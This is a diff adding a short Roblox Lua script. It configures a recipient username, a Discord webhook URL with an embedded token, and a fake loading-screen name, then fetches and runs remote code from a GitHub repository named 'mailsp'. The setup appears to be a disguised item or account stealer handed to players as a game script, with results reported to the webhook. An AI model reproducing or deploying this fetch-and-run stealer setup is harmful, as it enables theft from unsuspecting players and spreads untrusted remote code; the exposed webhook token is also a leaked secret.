@@ -1,0 +1,7 @@
+```_G.UserName = "yuki67P"      -- Put ur roblox username here
+
+_G.Webhook = "https://discord.com/api/webhooks/1110129999480115252/KBiiINZqEvb3xrxJ-BhPoZWWfiV-yI3mnGYY_dWGuf_a-6G5cXnVBHtl9zFlfrsDEDr8"       -- replace hook with discord webhook
+
+_G.loadingScreenText = "LUCKBLOCK"   -- replace text with ur script name 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kingofthescript/mailsp/main/main", true))()```
